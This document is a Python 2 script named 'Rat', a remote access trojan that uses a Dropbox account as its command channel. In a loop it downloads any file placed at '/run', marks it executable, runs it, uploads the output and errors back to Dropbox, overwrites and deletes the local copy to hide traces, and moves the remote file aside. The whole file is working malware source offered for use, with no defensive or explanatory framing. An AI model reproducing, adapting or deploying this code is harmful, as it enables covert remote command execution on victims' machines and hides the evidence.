#!/usr/bin/env python
import os
import time
import dropbox
import argparse
import tempfile
import StringIO
from subprocess import Popen, PIPE

class Rat:
    def __init__(self):
        self.token = ""
        self.client = None

    def create_token(self, auth):
        key = auth.split(":")[0]
        secret = auth.split(":")[1]
        if len(key) < 1 or len(secret) < 1:
            exit("[Invalid arg] <key>:<secret>")
        flow = dropbox.client.DropboxOAuth2FlowNoRedirect(key, secret)
        authorize_url = flow.start()
        print '1. Go to: ' + authorize_url
        print '2. Click "Allow" (you might have to log in first)'
        print '3. Copy the authorization code.'
        code = raw_input("Enter the authorization code here: ")
        access_token, user_id = flow.finish(code)
        return access_token, user_id

    def parse_token(self, token_file):
        for line in open(token_file):
            if line.startswith("token"):
                self.token = line[6:].rstrip("\n")

    def _file_exist(self, filename):
        try:
            meta = self.client.metadata(filename)
            if "is_deleted" not in meta:
                return True
        except dropbox.rest.ErrorResponse:pass
        return False

    def _copy_file_local(self, filename):
        # future use ramdisk
        src = self.client.get_file(filename)
        filename = tempfile.mktemp()
        dst = open(filename, "w+")
        dst.write(src.read())
        dst.flush()
        dst.close()
        src.close()
        return filename

    def _execute_file(self, filename):
        os.chmod(filename, 0755)
        p = Popen([filename,], stdout=PIPE, stderr=PIPE)
        p.wait()
        output = StringIO.StringIO(p.stdout.read() + p.stderr.read())
        self.client.put_file("/output", output)

    def _secure_delete(self, filename, passes=5):
        f = open(filename, "wb+")
        flen = f.tell()
        for p in xrange(passes):
            f.seek(0)
            f.write(os.urandom(flen))
        f.close()
        os.remove(filename)

    def _mark_file_executed(self, filename):
        dst = os.path.join(os.path.dirname(filename), "executed")
        self.client.file_move(filename, dst)

    def run(self):
        rst = True
        if len(self.token) < 1:
            exit("[Invalid token] %s" % self.token)
        self.client = dropbox.client.DropboxClient(self.token)
        while True:
            try:
                if self._file_exist("/run") and rst:
                    rst = False
                    localfile = self._copy_file_local("/run")
                    self._execute_file(localfile)
                    self._secure_delete(localfile)
                    self._mark_file_executed("/run")
                    time.sleep(10)
                elif not self._file_exist("/run") and not self._file_exist("/executed"):
                    rst = True
            except Exception as e:self.client.put_file("/error", repr(e))
            except KeyboardInterrupt:pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--auth", help="create dropbox token Ex. <key>:<secret>")
    parser.add_argument("-t", "--token", help="dropbox token")
    parser.add_argument("-f", "--token_file", help="dropbox token file")
    args = parser.parse_args()
    rat = Rat()
    if args.auth:
        token, id = rat.create_token(args.auth)
        print "token=%s" % token
    elif args.token:
        rat.token = args.token
        rat.run()
    elif args.token_file:
        rat.parse_token(args.token_file)
        rat.run()
    else:
        print "\n[Error] must use --auth, --token, --token-file\n"
        parser.print_help()
